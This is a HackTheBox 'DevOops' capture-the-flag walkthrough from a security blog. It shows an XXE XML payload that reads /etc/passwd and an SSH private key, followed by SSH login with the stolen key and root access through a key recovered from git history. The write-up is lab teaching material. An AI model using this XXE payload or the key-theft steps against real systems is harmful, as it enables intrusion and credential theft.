@@ -1,0 +1,111 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">HacktheBox DevOops Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-devoops-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-10-14T14:28:02+00:00">October 14, 2018</time><time class="updated" datetime="2025-07-05T14:58:23+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to solve another CTF challenge “DevOops”. DevOops is a retired vulnerable lab presented by Hack the Box for helping pentester’s to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.</span></p>
+<p><span style="color: #000000;"><strong>Level</strong>: Medium</span></p>
+<p><span style="color: #000000;"><strong>Task: </strong>To find user.txt and root.txt file</span></p>
+<p><em><span style="color: #000000;"><strong>Note</strong>: Since these labs are online available therefore they have a static IP. The IP of DevOops is 10.10.10.91</span></em></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<p><span style="color: #000000;"><strong>Scanning</strong> </span></p>
+<ul>
+<li><span style="color: #000000;">Open ports and Running services (Nmap)</span></li>
+</ul>
+<p><strong><span style="color: #000000;">Enumeration </span></strong></p>
+<ul>
+<li><span style="color: #000000;">Web Directory spidering </span></li>
+<li><span style="color: #000000;">Upload XML file </span></li>
+</ul>
+<p><strong><span style="color: #000000;">Exploit XXE </span></strong></p>
+<ul>
+<li><span style="color: #000000;">Intercept Browser request (Burp Suite)</span></li>
+<li><span style="color: #000000;">Access /etc/passwd file</span></li>
+<li><span style="color: #000000;">Steal SSH RSA key</span></li>
+</ul>
+<p><strong><span style="color: #000000;">Access Victim’s shell (SSH login)</span></strong></p>
+<ul>
+<li><span style="color: #000000;">Capture user.txt flag</span></li>
+</ul>
+<p><strong><span style="color: #000000;">Privilege Escalation</span></strong></p>
+<ul>
+<li><span style="color: #000000;">Capture root.txt flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong><u>Walkthrough</u></strong></span></p>
+<h3><span style="color: #800000;">Scanning</span></h3>
+<p><span style="color: #000000;">Let’s start off with our basic nmap command to find out the open ports and services.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p- -A 10.10.10.91 --open</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-_EbHbPEMpDY/W8NQmtTZcOI/AAAAAAAAasQ/hlNI2Ydq_5cvJllEZvWJqh-Wag-5iaqOwCEwYBhgL/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">From Nmap scanning, we have enumerated port 22 and 5000 are only open ports on the target’s network, therefore firstly, let’s navigate to port 5000 through a web browser. By exploring the given URL, it puts up following web page as shown in the below image.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.10.91:5000</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-a7ZQ6jV_-tE/W8NQoG24D1I/AAAAAAAAaso/_fTrCrYfQCsKlOS3lRlWJMnittC494acwCEwYBhgL/s1600/2.png"/></span></p>
+<h3><span style="color: #800000;">Enumeration </span></h3>
+<p><span style="color: #000000;">Since we didn’t get any remarkable clue from the home page, therefore, we have opted Dirb tool for directory enumeration thus execute the following command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://10.10.10.91:5000</pre>
+<p><span style="color: #000000;">Hmm!! Here I received HTTP response 200 for <em>/feed</em> and <em>/upload</em> directories.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-k6HPOEvAbnE/W8NQoV-IDqI/AAAAAAAAass/kzsOcN9f5TQgvke9Wiwn4bAtldXCwC_0gCEwYBhgL/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">So we explore <em>http://10.10.10.91:5000</em>/<em>upload </em>in the URL and further welcomed by following web Page given below. The following web page lets you upload an XML file, including XML elements Author, Subject and content. For that reason, we have created an XML file with the help of the following code and saved as <strong>1.xml.</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;?xml version="1.0"?&gt;
+  &lt;!DOCTYPE foo [
+   &lt;!ELEMENT foo ANY &gt;
+   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;
+  ]&gt;
+  &lt;feed&gt;
+    &lt;Author&gt;raj&lt;/Author&gt;
+    &lt;Subject&gt;chandel&lt;/Subject&gt;
+    &lt;Content&gt;&amp;xxe;&lt;/Content&gt;
+  &lt;/feed&gt;</pre>
+<p><span style="color: #000000;">Then browse the XML file, which you have created and intercept the browser request with the help of burp suite while uploading.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-WYz0USVJ9EQ/W8NQodnsruI/AAAAAAAAasw/PD45FE4jyMMCCt2kNY156wvKhnzIcdtZQCEwYBhgL/s1600/4.png"/></span></p>
+<h3><span style="color: #800000;">EXPLOIT XXE (XML External Entity)</span></h3>
+<p><span style="color: #000000;">Now send the intercepted data to the repeater.</span></p>
+<p><span style="color: #000000;">Inside XML file, we have injected malicious code to make the call for <em>/etc/passwd</em> file, thus, we need to analyze its result in the repeater.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-R5YVd1SWBqM/W8NQo1FMcyI/AAAAAAAAas0/FqHAKTyXlakA5JaD-5MnDIdpqyzh16cGwCEwYBhgL/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">And as you can observe from the given below image, the XML code is working wonderfully and throwing the content of /etc/passwd file to us.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-5T6WZQMiNFA/W8NQpVMrV_I/AAAAAAAAas8/n0-Kv5m1ZokJgBq9bcQr8zBTH2gVVBjhwCEwYBhgL/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">Similar, we extract the SSH RSA key by modifying XXE entry as shown in the below image. Now copy the whole key and save in a text file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-3x1zdy1vgDM/W8NQpJRBZTI/AAAAAAAAas4/q0IryfUHPfwBFgDUgtuVmNGftKFGgejIgCEwYBhgL/s1600/7.png"/></span></p>
+<h3><span style="color: #800000;">Access Victim’s Shell</span></h3>
+<p><span style="color: #000000;">Since we have copied RSA Private KEY in a text file named as “key”, then set permission 600 and try to login with the help of the following command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod 600 key
+ssh -i key roosa@10.10.10.91</pre>
+<p><span style="color: #000000;">Boom!! We have spawned a shell of target machines, let’s go for the user.txt file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /home
+ls
+cd roosa
+ls
+cat user.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-6KIBvMjjmPY/W8NQpX-Rv-I/AAAAAAAAatA/eaXqfr3PoNgQy_3Kya3Yptrxved6QrpWwCEwYBhgL/s1600/9.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">Great!!! We have completed the first task but for obtaining root.txt file we need to escalate the root privilege and to do so we traversed so many directories and files to get next clue.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd work
+ls
+cd blogfeed/
+ls
+cat run-gunicorn.sh
+cd resources
+ls</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-xb6hULfCa1w/W8NQm7nu6NI/AAAAAAAAasU/WMZd4FPnaBUeECaJyddUuAfxxO8h6CcBACEwYBhgL/s1600/10.png"/></strong></span></p>
+<p>so we found .git directory here lets check git with the following command.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">git log</pre>
+<p><span style="color: #000000;">And we obtain so many strings as shown in the following image which may perhaps SSH key for root login.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-1sR7PgKM5zk/W8NQnHBa7FI/AAAAAAAAasY/svfDJEmurr480GD9LX5OvRQfnyKf8WvJgCEwYBhgL/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">So we try some key along <strong>git show</strong> command to demonstrate the output result. And obtain RSA Private Key which was not working properly.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-cqmvBD1o5bY/W8NQnVJ8trI/AAAAAAAAasc/2n0V0KHh5q47slJw7Z_sON_bIqbSqncpgCEwYBhgL/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">And finally, we got the original RSA Key which is highlighted in Red text, now copy the red color text a file and remove ‘<strong>–</strong>’ used in each line instead add <strong>“—–END RSA PRIVATE KEY—–”</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-hODff1MuoAs/W8NQn1TKgLI/AAAAAAAAask/YlHcDSIBpRcZPcRMYiIkb5jpaN5sdcQjwCEwYBhgL/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">Since we have copied RSA Private KEY in a text file named as “rootkey” then set permission 600 and try to login with the help of the following command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod 600 key
+ssh -i rootkey root@10.10.10.91
+ls
+cat root.txt</pre>
+<p><span style="color: #000000;">Congrats!! We have found root.txt and from the image below you can see we have obtained the value of root.txt.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-In-acK-Hc20/W8NQn7td6-I/AAAAAAAAasg/8DW5SfFsaVEbaOp6UA3tKSHbFOhRK7FYgCEwYBhgL/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
